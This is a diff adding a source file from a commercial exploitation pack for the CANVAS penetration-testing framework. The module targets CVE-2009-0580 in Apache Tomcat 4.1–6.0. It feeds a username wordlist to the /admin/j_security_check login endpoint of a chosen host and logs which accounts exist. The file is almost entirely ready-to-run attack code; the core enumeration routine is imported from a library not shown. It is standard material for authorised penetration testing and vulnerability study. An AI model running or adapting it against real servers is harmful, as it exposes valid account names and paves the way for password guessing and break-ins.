@@ -1,0 +1,94 @@
+#! /usr/bin/env python
+# -*- coding: utf-8 -*-
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2010
+#
+
+import sys, os, string, time, re
+import pygtk
+import gobject
+import logging
+
+pygtk.require("2.0")
+import gtk
+import gtk.glade
+
+sys.path.append(".")
+sys.path.append(os.path.join(os.getcwd(), '3rdparty/D2SEC/libs'))
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+import canvasengine
+from canvasexploit import canvasexploit
+
+import appli.tomcat
+
+# GUI info
+NAME = "Apache Tomcat User Enumeration"
+DESCRIPTION = "Apache Tomcat User Enumeration Vulnerability" 
+VERSION="1.0"
+
+DOCUMENTATION = {}
+DOCUMENTATION['VENDOR'] = ''
+DOCUMENTATION["Repeatability"] = 'Infinite'
+DOCUMENTATION['Date public'] = '2009/02/13'
+DOCUMENTATION['References'] = 'http://www.securityfocus.com/bid/35196'
+DOCUMENTATION['Versions Affected'] = 'Apache Tomcat 4.1.0 through 4.1.39, 5.5.0 through 5.5.27, and 6.0.0 through 6.0.18'
+DOCUMENTATION["CERT Advisory"] = ''
+DOCUMENTATION["CVE Name"] = 'CVE-2009-0580'
+DOCUMENTATION["CVE Url"] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0580'
+
+DOCUMENTATION["Notes"] = ''
+
+PROPERTY={}
+PROPERTY['TYPE'] = 'Web Exploits'
+PROPERTY['SITE'] = 'Remote'
+PROPERTY['ARCH'] = [["Linux"], ["Windows"], ["Solaris"], ["AIX"], ["FreeBSD"], ["MacOSX"], ["HP-UX"]]
+
+class theexploit(canvasexploit):
+  def __init__(self):
+    canvasexploit.__init__(self)
+    self.name = NAME
+    self.host = ''
+    self.port = 80
+    self.url = '/admin/j_security_check'
+    self.userfile = ''
+    
+  def run(self):
+    self.host = self.target.interface	
+    self.port = int(self.argsDict.get('port', self.port))
+    self.url = self.argsDict.get('url', self.url)
+    self.userfile = self.argsDict.get('userfile', self.userfile)
+
+    self.setInfo('[D2 LOG] %s attacking %s - running'%(NAME,self.host))
+    self.log('[D2 LOG] User enumeration %s:%s' % (self.host, self.port))
+    wordlist = [] 
+    if self.userfile:
+      tmps = open(self.userfile, 'r').readlines()
+      for tmp in tmps:
+        wordlist.append(tmp[:-1])
+    try:
+      infos = appli.tomcat.enum_login(self.host, self.port, self.url, wordlist)
+    except Exception, e:
+      self.log('[D2 LOG] %s' % e)
+      self.setInfo('[D2 LOG] %s attacking %s - failed' % (NAME,self.host))
+      return 0
+    if infos:
+      for info in infos:
+        self.log('[D2 LOG] %s' % info)
+    self.log('\n')
+    self.setInfo('[D2 LOG] %s attacking %s - done' % (NAME,self.host))
+    return 1
+
+  def usage(self):
+  	print 'Usage: %s -t host -p port -0 url:<url> -O userfile:<filename>' % (sys.argv[0])
+  	return
+
+if __name__ == '__main__':
+  print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
+  app = theexploit()
+  ret = standard_callback_commandline(app)
